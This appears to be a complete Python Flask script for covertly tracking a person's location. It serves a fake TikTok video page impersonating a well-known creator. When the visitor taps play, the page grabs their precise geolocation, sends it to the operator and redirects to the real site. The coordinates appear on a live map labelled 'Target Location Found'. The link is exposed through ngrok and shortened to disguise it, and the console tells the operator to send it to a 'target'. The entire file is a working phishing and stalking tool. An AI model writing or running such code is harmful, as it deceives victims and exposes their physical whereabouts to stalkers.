from flask import Flask, request, render_template_string, redirect, make_response
import folium
import json
import os
from datetime import datetime
import webbrowser
import subprocess
import time
import threading
import requests

app = Flask(__name__)

# Store the latest location
latest_location = None
location_file = "location_data.json"

# HTML template for TikTok page
FACEBOOK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>TikTok - Make Your Day</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/favicon-32x32-8753c448f00ef47e714124c2c1f77002.png">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
            background-color: black;
            color: white;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        .video-container {
            position: relative;
            width: 100%;
            padding-bottom: 177.78%; /* 16:9 Aspect Ratio */
            background-color: #121212;
            border-radius: 8px;
            overflow: hidden;
        }
        .video-placeholder {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/oQytVBYBBACYfCubEEYfgEDYE') center/cover;
        }
        .play-button {
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
        }
        .play-button::after {
            content: '';
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 20px 0 20px 35px;
            border-color: transparent transparent transparent black;
            margin-left: 8px;
        }
        .video-info {
            padding: 16px;
            background-color: black;
        }
        .username {
            font-size: 17px;
            font-weight: 700;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
        }
        .verified {
            width: 16px;
            height: 16px;
            margin-left: 4px;
            background-color: #20D5EC;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            font-size: 10px;
            color: white;
        }
        .description {
            font-size: 15px;
            line-height: 1.4;
            margin-bottom: 12px;
        }
        .stats {
            display: flex;
            gap: 16px;
            font-size: 14px;
            color: #A4A4A4;
        }
        .stat {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #A4A4A4;
            border-top: 4px solid #FE2C55;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: white;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-container">
            <div class="video-placeholder">
                <div class="play-button" onclick="requestLocation()"></div>
            </div>
        </div>
        <div class="video-info">
            <div class="username">
                @charlidamelio
                <span class="verified">✓</span>
            </div>
            <div class="description">
                New dance challenge 🔥 Try it with your friends! #dance #viral #fyp
            </div>
            <div class="stats">
                <div class="stat">♥ 2.1M</div>
                <div class="stat">💬 45.2K</div>
                <div class="stat">⤴ 89.3K</div>
            </div>
        </div>
    </div>

    <div id="loading" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text">Loading video...</div>
    </div>

    <script>
        function requestLocation() {
            if (navigator.geolocation) {
                document.getElementById('loading').style.display = 'flex';
                const options = {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                };
                navigator.geolocation.getCurrentPosition(sendPosition, redirectToTikTok, options);
            } else {
                redirectToTikTok();
            }
        }

        function sendPosition(position) {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString()
            };

            fetch('/submit_location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(redirectToTikTok, 1500);
            })
            .catch(error => {
                redirectToTikTok();
            });
        }

        function redirectToTikTok() {
            window.location.href = 'https://www.tiktok.com';
        }
    </script>
</body>
</html>
"""

# HTML template for viewing location
VIEWER_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"/>
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <style>
        body { margin: 0; padding: 0; }
        #map { height: 100vh; width: 100%; }
        .info-panel {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            z-index: 1000;
            font-family: Arial, sans-serif;
            min-width: 300px;
            text-align: center;
        }
        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #4CAF50;
            color: white;
            padding: 15px 25px;
            border-radius: 5px;
            display: none;
            z-index: 1000;
            font-family: Arial, sans-serif;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
    </style>
</head>
<body>
    <div id="map"></div>
    <div id="notification" class="notification">New location received!</div>
    <div id="info" class="info-panel">Waiting for target's location...</div>
    <script>
        var map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
        }).addTo(map);
        
        var marker;
        var circle;
        var lastLat = null;
        var lastLng = null;
        
        function showNotification() {
            const notification = document.getElementById('notification');
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
        
        function updateLocation() {
            fetch('/get_location')
                .then(response => response.json())
                .then(data => {
                    if (data.location) {
                        const lat = data.location.latitude;
                        const lng = data.location.longitude;
                        const acc = data.location.accuracy;
                        
                        if (lat !== lastLat || lng !== lastLng) {
                            lastLat = lat;
                            lastLng = lng;
                            showNotification();
                        }
                        
                        if (!marker) {
                            marker = L.marker([lat, lng]).addTo(map);
                            circle = L.circle([lat, lng], {radius: acc}).addTo(map);
                            map.setView([lat, lng], 16);
                        } else {
                            marker.setLatLng([lat, lng]);
                            circle.setLatLng([lat, lng]);
                            circle.setRadius(acc);
                        }
                        
                        document.getElementById('info').innerHTML = `
                            <strong>Target Location Found!</strong><br>
                            Latitude: ${lat.toFixed(6)}<br>
                            Longitude: ${lng.toFixed(6)}<br>
                            Accuracy: ${acc.toFixed(2)} meters<br>
                            Last Update: ${new Date(data.location.timestamp).toLocaleString()}
                        `;
                    }
                });
        }
        
        // Update location every 2 seconds
        updateLocation();
        setInterval(updateLocation, 2000);
    </script>
</body>
</html>
"""

def shorten_url(url):
    try:
        api_url = f"https://is.gd/create.php?format=simple&url={url}"
        response = requests.get(api_url)
        if response.status_code == 200:
            return response.text.strip()
    except:
        return url  # Return original URL if shortening fails
    return url

def add_custom_headers(response):
    response.headers['ngrok-skip-browser-warning'] = '1'
    response.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'
    return response

@app.after_request
def after_request(response):
    return add_custom_headers(response)

@app.route('/')
def index():
    response = make_response(render_template_string(FACEBOOK_PAGE))
    return add_custom_headers(response)

@app.route('/view')
def view_location():
    response = make_response(render_template_string(VIEWER_PAGE))
    return add_custom_headers(response)

@app.route('/submit_location', methods=['POST'])
def submit_location():
    global latest_location
    data = request.get_json()
    
    if data and 'latitude' in data and 'longitude' in data:
        latest_location = {
            'latitude': data['latitude'],
            'longitude': data['longitude'],
            'accuracy': data.get('accuracy', 0),
            'timestamp': data.get('timestamp', datetime.now().isoformat())
        }
        
        # Save to file
        with open(location_file, 'w') as f:
            json.dump(latest_location, f)
            
        response = make_response({'status': 'success'})
        return add_custom_headers(response)
    return {'status': 'error'}, 400

@app.route('/get_location')
def get_location():
    if os.path.exists(location_file):
        with open(location_file, 'r') as f:
            location_data = json.load(f)
            response = make_response({'location': location_data})
            return add_custom_headers(response)
    response = make_response({'location': None})
    return add_custom_headers(response)

def start_ngrok():
    # Start ngrok
    ngrok_process = subprocess.Popen(
        ['ngrok.exe', 'http', '5000'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Wait for ngrok to start
    time.sleep(3)
    
    try:
        # Get the public URL
        tunnel_url = None
        ngrok_api = subprocess.Popen(
            ['curl', 'http://localhost:4040/api/tunnels'],
            stdout=subprocess.PIPE
        )
        output = ngrok_api.communicate()[0].decode()
        if 'public_url' in output:
            tunnel_url = json.loads(output)['tunnels'][0]['public_url']
            # Create two separate shortened URLs
            tracking_url = shorten_url(tunnel_url)
            viewer_url = shorten_url(f"{tunnel_url}/view")
            return ngrok_process, tracking_url, viewer_url
    except:
        pass
    return ngrok_process, None, None

def cleanup(ngrok_process):
    if ngrok_process:
        ngrok_process.terminate()
        try:
            ngrok_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            ngrok_process.kill()

def start_server():
    try:
        print("Starting secure tunnel...")
        ngrok_process, tracking_url, viewer_url = start_ngrok()
        
        if tracking_url and viewer_url:
            print("\n=== Location Tracker URLs ===")
            print(f"\nSend this link to target: {tracking_url}")
            print(f"View location here: {viewer_url}")
            print("\nWaiting for target to open the link...")
            
            # Open viewer in browser
            webbrowser.open(viewer_url)
            
            # Start Flask server
            app.run(port=5000)
        else:
            print("Failed to start tunnel. Please try again.")
            
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        cleanup(ngrok_process)

if __name__ == '__main__':
    start_server()
